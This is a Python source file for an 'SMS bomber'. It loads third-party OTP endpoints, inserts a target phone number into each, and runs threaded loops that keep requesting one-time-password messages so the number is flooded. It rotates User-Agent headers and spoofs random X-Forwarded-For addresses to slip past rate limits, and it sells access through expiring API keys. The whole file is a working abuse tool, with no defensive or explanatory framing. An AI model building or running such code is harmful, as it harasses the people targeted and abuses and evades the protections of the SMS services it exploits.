import requests
import threading
import time
import random
import json
from queue import Queue
from datetime import datetime

class SMSBomber:
    def __init__(self, requests_file='requests/requests.json', keys_file='config/keys.json'):
        self.requests_file = requests_file
        self.keys_file = keys_file
        self.running = False
        self.stats = {'sent': 0, 'failed': 0, 'rate_limited': 0}
        self.lock = threading.Lock()
        self.load_requests()
        self.load_keys()

    def load_requests(self):
        try:
            with open(self.requests_file, 'r') as f:
                self.requests = json.load(f)
        except:
            self.requests = []

    def save_requests(self):
        with open(self.requests_file, 'w') as f:
            json.dump(self.requests, f, indent=2)

    def load_keys(self):
        try:
            with open(self.keys_file, 'r') as f:
                self.keys = json.load(f)
        except:
            self.keys = {}

    def save_keys(self):
        with open(self.keys_file, 'w') as f:
            json.dump(self.keys, f, indent=2)

    def add_request(self, name, url, method, headers, body, phones):
        req = {
            'name': name,
            'url': url,
            'method': method,
            'headers': headers,
            'body': body,
            'phones': phones,
            'active': True,
            'created': datetime.now().isoformat()
        }
        self.requests.append(req)
        self.save_requests()
        return req

    def toggle_request(self, idx):
        if 0 <= idx < len(self.requests):
            self.requests[idx]['active'] = not self.requests[idx]['active']
            self.save_requests()
            return True
        return False

    def delete_request(self, idx):
        if 0 <= idx < len(self.requests):
            self.requests.pop(idx)
            self.save_requests()
            return True
        return False

    def generate_key(self, expiry=3600):
        key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))
        self.keys[key] = {
            'created': datetime.now().isoformat(),
            'expiry': expiry,
            'expires_at': (datetime.now().timestamp() + expiry) if expiry > 0 else None
        }
        self.save_keys()
        return key

    def validate_key(self, key):
        if key not in self.keys:
            return False
        key_data = self.keys[key]
        if key_data['expires_at'] and datetime.now().timestamp() > key_data['expires_at']:
            return False
        return True

    def send_request(self, req, phone):
        """Send a single request with rotation"""
        url = req['url'].replace('{phone}', phone)
        headers = req['headers'].copy()
        
        # Add rotation headers
        headers['User-Agent'] = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ])
        headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        body = req['body']
        if body:
            body = body.replace('{phone}', phone)
            try:
                body = json.loads(body) if isinstance(body, str) else body
            except:
                pass

        try:
            if req['method'] == 'POST':
                r = requests.post(url, headers=headers, json=body if isinstance(body, dict) else {}, timeout=5)
            else:
                r = requests.get(url, headers=headers, timeout=5)
            
            with self.lock:
                if r.status_code == 200:
                    self.stats['sent'] += 1
                    return {'status': r.status_code, 'message': 'OTP Sent'}
                elif r.status_code == 429:
                    self.stats['rate_limited'] += 1
                    return {'status': r.status_code, 'message': 'Rate Limited'}
                else:
                    self.stats['failed'] += 1
                    return {'status': r.status_code, 'message': r.text[:100]}
        except Exception as e:
            with self.lock:
                self.stats['failed'] += 1
            return {'status': 'ERROR', 'message': str(e)[:100]}

    def start_bombing(self, phone, api_key, speed=10):
        """Start bombing with all active requests"""
        if not self.validate_key(api_key):
            return {'error': 'Invalid or expired API key'}

        active_requests = [r for r in self.requests if r.get('active', True)]
        if not active_requests:
            return {'error': 'No active requests found'}

        self.running = True
        self.stats = {'sent': 0, 'failed': 0, 'rate_limited': 0}
        
        def worker(req):
            while self.running:
                # Rotate phone numbers
                phone_variants = req.get('phones', [phone])
                target_phone = random.choice(phone_variants) if phone_variants else phone
                result = self.send_request(req, target_phone)
                # Log to console
                print(f"[{req['name']}] {result['status']} | {target_phone}")
                time.sleep(1.0 / speed)

        threads = []
        for req in active_requests:
            t = threading.Thread(target=worker, args=(req,))
            t.daemon = True
            t.start()
            threads.append(t)

        return {'success': True, 'message': f'Bombing started with {len(active_requests)} requests', 'threads': len(threads)}

    def stop_bombing(self):
        self.running = False
        return {'success': True, 'message': 'Bombing stopped', 'stats': self.stats}

    def get_stats(self):
        with self.lock:
            return self.stats.copy()

# Singleton
bomber = SMSBomber()
